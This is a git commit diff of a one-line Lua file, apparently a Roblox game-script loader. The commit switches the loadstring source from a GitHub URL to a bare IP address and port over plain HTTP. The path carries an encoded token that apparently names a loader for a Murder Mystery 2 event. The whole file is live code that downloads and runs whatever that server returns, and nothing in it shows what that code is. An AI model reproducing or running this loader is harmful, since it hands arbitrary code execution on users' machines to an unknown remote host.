9e225858b4c6338426de85adc87b019f31e7d845
hoodratleahh <106627622+hoodratleahh@users.noreply.github.com>
2025-12-21 14:41:37 -0500

    Update hjndndnd.lua

--- hjndndnd.lua
+++ hjndndnd.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratleahh/newhoo/refs/heads/main/officialscript.lua"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImQzODFmNDhmLTI5YjYtNDEzNi1hMDczLTM0ZjM5NzAyYzZmMyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
